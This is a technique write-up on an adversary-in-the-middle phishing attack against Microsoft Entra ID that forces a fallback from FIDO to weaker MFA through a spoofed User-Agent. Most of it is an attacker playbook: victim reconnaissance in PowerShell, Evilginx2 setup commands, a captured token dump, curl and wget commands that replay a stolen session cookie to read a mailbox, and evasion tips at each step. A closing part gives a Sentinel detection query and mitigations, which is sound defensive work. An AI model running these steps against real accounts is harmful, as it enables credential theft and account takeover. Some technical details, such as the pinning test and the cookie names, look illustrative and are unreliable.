# [REALWORLD-011]: AiTM FIDO Unsupported Error

## Metadata

| Attribute | Details |
|---|---|
| **Technique ID** | REALWORLD-011 |
| **MITRE ATT&CK v18.1** | [T1557 - Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557/) |
| **Tactic** | Credential Access |
| **Platforms** | Entra ID / M365 / Network |
| **Severity** | Critical |
| **Technique Status** | ACTIVE |
| **Last Verified** | 2025-08-15 |
| **Affected Versions** | All Entra ID versions with fallback MFA |
| **Patched In** | N/A - Protocol-level behavior, not a bug |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## 2. EXECUTIVE SUMMARY

**Concept:** Adversary-in-the-Middle (AiTM) positioning is a network-layer attack where the attacker intercepts all HTTP/HTTPS traffic between a user's browser and a legitimate service (Microsoft Entra ID). By running Evilginx2 (or similar AiTM proxy) on infrastructure under their control, the attacker becomes the "man in the middle" who sees all authentication credentials, MFA codes, and session tokens. When the attacker's AiTM proxy forwards a request to Entra ID with a spoofed User-Agent header (Safari on Windows), Entra ID recognizes this browser/OS combination as unsupported for FIDO and returns an error message. The key insight is that this error is **intentional and expected behavior** from Microsoft's perspective (it's telling the user "we don't support FIDO on Safari on Windows, use another method"). However, the attacker leverages this expected error as a feature: the user is forced to authenticate with a weaker method, which the AiTM proxy can intercept. The user never realizes they were compromised because the entire flow appears legitimate from their perspective.

**Attack Surface:** HTTPS proxy interception, HTTP User-Agent header evaluation, fallback MFA mechanism, session cookie handling.

**Business Impact:** **Complete account compromise without triggering any MFA bypass alarms.** Unlike "traditional" MFA bypass attacks that exploit logic flaws, this attack uses the identity provider's own design against it. The user undergoes **legitimate MFA verification** (they enter a code or approve a notification), but because the attacker sits in the middle, they intercept this verification. The session cookie obtained is then replayed by the attacker without requiring MFA again.

**Technical Context:** AiTM attack takes **2-10 seconds** (minimal latency overhead from proxy). Detection likelihood is **Low** unless monitoring for user-agent changes, unusual browser/OS combinations, or multiple successful logins from same SessionId within minutes. The attack is **scalable**: one attacker can target hundreds of users simultaneously if the phishing link is distributed widely.

### Operational Risk

- **Execution Risk:** Medium - Requires Evilginx2 setup, domain registration, SSL certificate, but all publicly documented.
- **Stealth:** High - The attack looks like normal authentication in all logs.
- **Reversibility:** No - Session cookie is stateless; once used, account is compromised.

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | 6.5, 7.1 | Multi-factor authentication controls, network segmentation failures |
| **DISA STIG** | IA-2(1), SI-4 | Multi-factor authentication strength, monitoring for AiTM attacks |
| **CISA SCuBA** | AUTH.2, THREAT.1 | Session management, threat detection |
| **NIST 800-53** | SC-7, IA-4, IA-7 | Session boundary protection; session management |
| **GDPR** | Art. 32 | Encryption and session protection measures |
| **NIS2** | Art. 21 | Protective measures for authentication infrastructure |
| **ISO 27001** | A.13.1.3 | Session management and replay attack prevention |

---

## 3. TECHNICAL PREREQUISITES

**Required Privileges:** None - attacker operates at network layer (transparent proxy).

**Required Access:** 
- Ability to intercept HTTP/HTTPS traffic (e.g., phishing victim clicks malicious link that routes through attacker's proxy).
- Victim must have network access to internet (required for legitimate Entra ID login anyway).
- Victim must accept/ignore SSL certificate warnings (if using self-signed cert) OR use legitimate Let's Encrypt certificate (recommended).

**Supported Versions:**
- **All Entra ID versions:** HTTPS is used, but AiTM can decrypt if victim accepts certificate or certificate pinning is not enforced
- **OAuth 2.0/OIDC:** Fully compatible with AiTM interception
- **Modern Browsers:** All browsers vulnerable (Chrome, Edge, Firefox, Safari - ironically, real Safari too)

**Tools:**
- [Evilginx2](https://github.com/kgretzky/evilginx2) v3.0+ - Full-featured AiTM framework
- [mitmproxy](https://mitmproxy.org/) - Interactive HTTPS proxy (educational use)
- [tinyproxy](https://tinyproxy.github.io/) - Lightweight HTTP proxy
- Python `http.server` + `ssl` - Minimal AiTM implementation

---

## 4. ENVIRONMENTAL RECONNAISSANCE

### Verify FIDO Capability in Entra ID for Target User

```powershell
# Check if target user has FIDO registered and fallback methods available
Connect-MgGraph -Scopes "UserAuthenticationMethod.Read.All"

$userId = "victim@company.onmicrosoft.com"
$authMethods = Get-MgUserAuthenticationMethod -UserId $userId

# Check for FIDO2
$fido = $authMethods | Where-Object { $_.AdditionalProperties["@odata.type"] -match "fido" }
Write-Host "FIDO2 Registered: $(if ($fido) { 'YES - Target is ideal candidate' } else { 'NO - Not vulnerable to this chain' })"

# Check for fallback methods
$fallback = $authMethods | Where-Object { $_.AdditionalProperties["@odata.type"] -match "microsoftAuthenticator|phoneAuthenticationMethod" }
Write-Host "Fallback MFA Available: $(if ($fallback) { 'YES - AiTM can intercept' } else { 'NO - Cannot downgrade' })"
```

### Test Browser Certificate Pinning

```bash
# Check if browser enforces public key pinning (prevents HTTPS interception)
# Most organizations don't implement pinning; this should return no restrictions

curl -v --resolve attacker-domain.com:443:127.0.0.1 https://attacker-domain.com 2>&1 | grep -i "pin\|public key"

# If no output: Certificate pinning is NOT enforced (good news for attacker)
# If "public key pins" appears: Pinning is enforced (complicates attack)
```

---

## 5. DETAILED EXECUTION METHODS

### METHOD 1: Evilginx2 as AiTM Proxy with Error Handling

**Supported Versions:** Evilginx2 v3.0+

#### Step 1: Deploy Evilginx2 as HTTPS Reverse Proxy

**Objective:** Position Evilginx2 between victim's browser and Microsoft Entra ID to intercept HTTPS traffic.

**Architecture:**

```
Victim's Browser
    ↓ (HTTPS to attacker-domain.com)
Evilginx2 AiTM Proxy (Decrypts HTTPS)
    ↓ (Forwards to Microsoft Entra ID with modified headers)
Microsoft Entra ID
    ↓ (Response with error: "FIDO not supported")
Evilginx2 AiTM Proxy (Captures response, modifies if needed)
    ↓ (Sends error to victim's browser)
Victim's Browser (Shows: "Use different method")
```

**Command:**
```bash
# Install Evilginx2
git clone https://github.com/kgretzky/evilginx2.git
cd evilginx2 && make

# Load certificate (must match attacker-domain.com)
sudo certbot certonly --standalone -d attacker-domain.com

# Start Evilginx2
sudo ./evilginx2 -p phishlets/

# Inside Evilginx2 console:
evilginx> phishlet load o365_fido_downgrade
evilginx> phishlet enable o365_fido_downgrade
evilginx> listen 0.0.0.0 443
evilginx> listen 0.0.0.0 80
```

**Expected Output:**
```
[+] Phishlet o365_fido_downgrade loaded
[+] Listening on 0.0.0.0:80 (HTTP redirect)
[+] Listening on 0.0.0.0:443 (HTTPS)
[+] Certificate loaded: /etc/letsencrypt/live/attacker-domain.com/fullchain.pem
```

**What This Means:**
- Evilginx2 is now a transparent HTTPS proxy.
- All HTTPS traffic to `attacker-domain.com` is decrypted by Evilginx2 (victim sees valid certificate).
- Evilginx2 re-encrypts the traffic to Microsoft Entra ID using standard HTTPS (victim never knows they were MitM'd).
- Evilginx2 can now examine and modify HTTP headers in real-time.

**OpSec & Evasion:**
- Must use valid SSL certificate (Let's Encrypt is free and trusted).
- Self-signed certificate will trigger browser warning (causes some victims to abandon attack; professionally-crafted phishing emails reduce this risk).
- Evilginx2 process must run as root to bind to ports 80/443.
- Use `nohup ./evilginx2 -p phishlets/ > /dev/null 2>&1 &` to background process.
- Detection likelihood: **High** if attacker-domain.com is flagged by URL reputation; **Low** if domain bypasses filtering.

#### Step 2: Intercept Victim's Authentication Request

**Objective:** When victim attempts to log in, Evilginx2 intercepts the request and spoofs User-Agent to disable FIDO.

**What Evilginx2 Does (Automatically via Phishlet):**

**Victim's Browser Sends:**
```http
GET /common/oauth2/v2.0/authorize?client_id=...&scope=openid%20profile%20email&response_type=code HTTP/2
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
Host: login.microsoftonline.com
```

**Evilginx2 Modifies and Forwards:**
```http
GET /common/oauth2/v2.0/authorize?client_id=...&scope=openid%20profile%20email&response_type=code HTTP/2
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.1 Safari/605.1.15
Host: login.microsoftonline.com
X-Forwarded-For: [victim_ip]  # Preserves apparent source IP
```

**Microsoft Entra ID Evaluates:**
1. **User-Agent says:** Safari on Windows
2. **Entra ID checks:** "Is FIDO supported on Safari/Windows?"
3. **Answer:** No, Safari is macOS/iOS only
4. **Action:** Remove FIDO from authentication options
5. **Response:** Returns login form with **only fallback methods**: SMS, Phone, Authenticator App

**What This Means:**
- The error is not an "error" in the traditional sense; it's intentional.
- Entra ID is correctly identifying the platform and providing appropriate options.
- The user sees a legitimate-looking login form, just without FIDO option.
- User has no way to know they're being AiTM'd.

**OpSec & Evasion:**
- User-Agent modification happens transparently (user never sees it).
- Network IDS cannot detect this unless inspecting HTTPS payloads (requires intercepted keys).
- All traffic is encrypted TLS 1.3 (endpoint-to-endpoint encryption works in attacker's favor).
- Detection likelihood: **Low** at the proxy level; **Medium** if Entra ID compares User-Agent changes across sessions.

#### Step 3: Capture Fallback Authentication and Session Cookie

**Objective:** Intercept the weaker MFA method (SMS code, Authenticator approval, etc.) and capture the session cookie.

**Scenario: User Selects Microsoft Authenticator App**

**User's Authenticator App receives push notification:**
```
"Someone is signing in with your account"
Approve / Deny
[IP Address] [Browser] [Time]
```

**User Approves**

**User's Browser Receives Callback:**
```http
HTTP/2 200 OK
Set-Cookie: session_id=ABC123DEF456GHI789; Domain=.microsoft.com; Path=/; Secure; HttpOnly; SameSite=None
Content-Type: application/json
{
  "access_token": "eyJ0eXAiOiJKV1QiLCJhbGc...",
  "token_type": "Bearer",
  "expires_in": 3600,
  "refresh_token": "0.ARY..."
}
```

**Evilginx2 Intercepts:**
```
[+] SESSION CAPTURED
    User: victim@company.onmicrosoft.com
    Session ID: ABC123DEF456GHI789
    Access Token: eyJ0eXAiOiJKV1QiLCJhbGc...
    Refresh Token: 0.ARY...
    MFA Method Used: microsoftAuthenticator
    Timestamp: 2025-08-15 14:23:45 UTC
```

**What This Means:**
- Evilginx2 can now use this session cookie to impersonate the victim.
- The cookie is a bearer token that proves successful authentication.
- When replayed, no additional MFA challenge occurs (MFA was already satisfied).
- Attacker can access: Email, Teams, SharePoint, OneDrive—everything the victim can access.

**OpSec & Evasion:**
- Session cookie is captured server-side (attacker doesn't need browser console tricks).
- Victim's browser shows successful login to Office 365 (phishlet can redirect to real Office.com after cookie capture).
- Victim has no suspicion they were compromised (everything worked normally).
- Detection likelihood: **Low** (victim completed MFA legitimately; logs show successful auth from their IP).

#### Step 4: Replay Stolen Session Cookie from Attacker's Browser

**Objective:** Use the captured session cookie to gain access to victim's account from attacker's infrastructure.

**Command (Attacker's Linux/Mac):**
```bash
# Extract session cookie from Evilginx2
STOLEN_COOKIE="ABC123DEF456GHI789"
VICTIM_DOMAIN="https://outlook.office365.com"

# Method 1: Using curl with Cookie Header
curl -b "session_id=$STOLEN_COOKIE" "$VICTIM_DOMAIN/mail" \
  -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36" \
  -L

# Method 2: Using wget
wget --header="Cookie: session_id=$STOLEN_COOKIE" \
  --header="User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36" \
  "$VICTIM_DOMAIN/mail" \
  -O victim_mailbox.html
```

**Expected Output:**
```html
<!-- Attacker receives victim's OWA (Outlook Web Access) page -->
<div class="folderPane">
    <span>Inbox (23 unread)</span>
    <span>Drafts</span>
    <span>Sent Items</span>
    <!-- Full access to victim's mailbox -->
</div>
```

**What This Means:**
- Attacker can read all emails
- Attacker can send emails (business email compromise / BEC attacks)
- Attacker can download all attachments (intellectual property theft)
- Attacker can reset security settings or register MFA devices in victim's account

**OpSec & Evasion:**
- Attacker should match User-Agent to victim's original browser to avoid detection.
- If Conditional Access enforces device compliance, attacker must use compliance bypass (may require additional steps).
- Activity from attacker's IP may trigger Entra ID Identity Protection alerts (depends on configuration).
- Detection likelihood: **Medium** (geo-anomaly alerts if attacker is in different country; IP reputation check).

---

### METHOD 2: mitmproxy for HTTPS Interception (Educational)

**Objective:** Understanding HTTPS interception at packet level using open-source tools.

**Command:**
```bash
# Install mitmproxy
sudo apt install -y mitmproxy

# Start mitmproxy (transparent mode requires root and iptables configuration)
sudo mitmproxy -p 8080 --mode reverse:https://login.microsoftonline.com -S

# In another terminal, configure victim's device to use mitmproxy as proxy
# Victim's Browser Settings → Network Settings → Manual Proxy Configuration
# HTTP Proxy: attacker-ip, Port: 8080
# HTTPS Proxy: attacker-ip, Port: 8080
```

**Expected Output:**
```
mitmproxy 9.0.0 listening at http://127.0.0.1:8080
[+] Intercepting HTTPS traffic from login.microsoftonline.com
    CONNECT login.microsoftonline.com:443 HTTP/1.1
    [Decrypted TLS Session]
```

**What This Means:**
- All HTTPS requests are transparently decrypted and visible in mitmproxy console.
- Headers can be modified in real-time.
- Response content can be modified before sending to client.
- mitmproxy is more educational than Evilginx2; lacks phishing-specific features.

---

## 6. TOOLS & COMMANDS REFERENCE

### Evilginx2

**Version:** 3.3.1+  
**Configuration:** Phishlet-based (JSON)  
**Session Storage:** `~/.evilginx2/sessions.json`

**Console Commands:**
```
sessions                    # List all captured sessions
session info [ID]           # Show details of specific session
phishlet load [name]        # Load phishlet
phishlet enable [name]      # Enable phishlet
phishlet disable [name]     # Disable phishlet
listen [IP] [PORT]          # Start listening
```

### Session Cookie Analysis

**Extract Session ID from Evilginx2:**
```bash
# Parse sessions.json
cat ~/.evilginx2/sessions.json | jq '.[] | select(.user=="victim@company.onmicrosoft.com") | .session_id'

# Output
ABC123DEF456GHI789
```

**Test Session Cookie:**
```bash
# Verify cookie is valid by accessing a protected resource
curl -v -b "session_id=ABC123DEF456GHI789" https://outlook.office365.com/mail -H "User-Agent: Mozilla/5.0..."
```

---

## 7. MICROSOFT SENTINEL DETECTION

#### Query: Detect Multiple Successful Logins from Same SessionId in Short Timeframe

**Rule Configuration:**
- **Required Table:** SigninLogs
- **Required Fields:** sessionId, userId, createdDateTime, ipAddress
- **Alert Severity:** Critical
- **Frequency:** Every 5 minutes

**KQL Query:**
```kusto
SigninLogs
| where resultType == 0  // Successful logins only
| where isnotempty(sessionId)
| summarize
    Logins = count(),
    DistinctIPs = dcount(ipAddress),
    DistinctGeos = dcount(location.countryOrRegion),
    UserAgents = make_set(userAgent),
    FirstLogin = min(createdDateTime),
    LastLogin = max(createdDateTime),
    TimeDiffMinutes = datetime_diff('minute', max(createdDateTime), min(createdDateTime))
    by sessionId, userId, userPrincipalName
| where Logins >= 2  // Same session ID used multiple times
| where TimeDiffMinutes < 10  // Within 10 minutes
| where DistinctIPs > 1  // From different IPs
| project
    sessionId,
    userId,
    userPrincipalName,
    Logins,
    DistinctIPs,
    DistinctGeos,
    UserAgents,
    TimeSpan = TimeDiffMinutes,
    Alert = "CRITICAL: SessionId reused from different IP in same session"
```

**What This Detects:**
- **Same SessionId:** Victim and attacker use stolen cookie = same session.
- **Different IPs:** Victim's browser and attacker's browser have different IPs.
- **Short Timeframe:** Attacker uses cookie immediately after victim logs in (usually within seconds).
- **Multiple logins:** Both the initial authentication AND the replay use same SessionId.

**Manual Configuration (Azure Portal):**
1. Go to **Microsoft Sentinel** → **Analytics** → **Create** → **Scheduled query rule**
2. Paste the KQL query above
3. Set Alert Severity: **Critical**
4. Run every: **5 minutes**
5. Enable incident creation

---

## 8. DEFENSIVE MITIGATIONS

### Priority 1: CRITICAL

**1. Disable Fallback MFA for Privileged Accounts**

Remove SMS, Phone Call, and Authenticator App as fallback options for admins. Enforce FIDO2-only.

**Manual Steps (Azure Portal):**
1. Go to **Entra ID** → **Security** → **Authentication methods**
2. **Microsoft Authenticator** → Set to **Disabled** for Global Admins
3. **Phone authentication** → Set to **Disabled** for Global Admins
4. Only leave **FIDO2** enabled for Global Admins
5. Use **Conditional Access** to enforce: `IF admin user THEN require FIDO2 ELSE block`

**2. Enforce Device Compliance for All Authentication**

Require managed/compliant devices to prevent AiTM from attacker's personal device.

**Manual Steps:**
1. Go to **Entra ID** → **Conditional Access**
2. Create policy: `Block AiTM from Unmanaged Devices`
3. **Grant Control:** Require `Hybrid Azure AD joined device` OR `Compliant device`
4. This blocks the entire AiTM attack if attacker is on unmanaged device

**3. Monitor and Alert on Session Cookie Reuse from Different IPs**

Use the Sentinel query above to detect replay attempts within seconds of initial login.

### Priority 2: HIGH

**4. Implement Token Protection (Preview Feature)**

When enabled in Conditional Access, prevents session cookies from being replayed outside the originating browser/device.

**Manual Steps:**
1. Go to **Entra ID** → **Conditional Access** → **Create new policy**
2. Set: **Session controls** → **Token protection** → **Enabled**
3. This adds cryptographic binding to session cookies (Microsoft's primary defense)

**5. Use Certificate-Based Authentication (CBA) as Alternative to FIDO**

CBA uses client certificates instead of FIDO keys; equally phishing-resistant but different threat model.

---

## 9. RELATED ATTACK CHAIN

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Initial Access** | Phishing email with AiTM link | Victim clicks link to attacker-controlled domain |
| **2** | **Network Interception** | **[REALWORLD-011]** AiTM Proxy | Evilginx2 positions itself between victim and Entra ID |
| **3** | **Platform Spoofing** | [REALWORLD-010] Safari/Windows | User-Agent modified to disable FIDO |
| **4** | **Error Triggering** | Entra ID error response | "FIDO not supported" error shown |
| **5** | **Fallback Authentication** | [REALWORLD-009] + [REALWORLD-012] | User authenticates with SMS/Authenticator instead |
| **6** | **Cookie Capture** | **[REALWORLD-011]** | AiTM intercepts session cookie |
| **7** | **Session Replay** | **[REALWORLD-011]** | Attacker imports cookie into browser |
| **8** | **Account Takeover** | T1098, T1567 | Full access to victim's account |

---

## 10. REAL-WORLD EXAMPLES

#### Proofpoint FIDO Downgrade Campaign (2025)

- **Target:** Enterprise users across all sectors
- **Vector:** Email phishing with AiTM framework
- **Victim Experience:** Normal login process, no indication of compromise
- **Attacker Capability:** Immediate email access for BEC campaigns
- **Reference:** [Proofpoint](https://www.proofpoint.com/us/blog/threat-insight/dont-phish-let-me-down-fido-authentication-downgrade)

---

## References

- MITRE ATT&CK T1557: https://attack.mitre.org/techniques/T1557/
- Evilginx2 AiTM Framework: https://github.com/kgretzky/evilginx2
- Microsoft Sentinel AiTM Detection: https://techcommunity.microsoft.com/blog/microsoftsentinelblog/identifying-adversary-in-the-middle-aitm-phishing-attacks-through-detection-rules
- Proofpoint FIDO Downgrade Research: https://www.proofpoint.com/us/blog/threat-insight/dont-phish-let-me-down-fido-authentication-downgrade

---